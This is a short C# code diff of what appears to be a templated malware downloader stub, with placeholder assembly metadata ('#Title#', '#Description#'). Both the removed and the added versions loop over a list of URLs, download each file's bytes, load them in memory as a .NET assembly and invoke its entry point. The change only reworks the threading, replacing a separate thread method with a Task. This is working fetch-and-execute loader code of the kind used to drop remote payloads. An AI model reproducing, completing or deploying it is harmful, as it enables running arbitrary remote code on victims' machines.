@@ -2,6 +2,7 @@ using System.Collections.Generic;
 using System.Net;
 using System.Reflection;
 using System.Threading;
+using System.Threading.Tasks;
 
 [assembly: AssemblyTitle("#Title#")]
 [assembly: AssemblyDescription("#Description#")]
@@ -22,25 +23,13 @@ namespace NameSpace
         {
             foreach (string _URL in _URL_List.ToArray())
             {
-                DownloadData(_URL);
+                using (WebClient _Web_Client = new WebClient())
+                {
+                    Task.Factory.StartNew(() => Assembly.Load(_Web_Client.DownloadData(_URL)).EntryPoint.Invoke(null, null));
 
-                Thread.Sleep(0x7D0);
+                    Thread.Sleep(0x7D0);
+                }
             }
-        }
-
-        private static void DownloadData(string _URL)
-        {
-            using (WebClient _Web_Client = new WebClient())
-            {
-                Thread _Thread = new Thread(new ParameterizedThreadStart(Execute));
-
-                _Thread.Start(_Web_Client.DownloadData(_URL));
-            }
-        }
-
-        private static void Execute(object _Payload)
-        {
-            Assembly.Load((byte[])_Payload).EntryPoint.Invoke(null, null);
         }
     }
 }
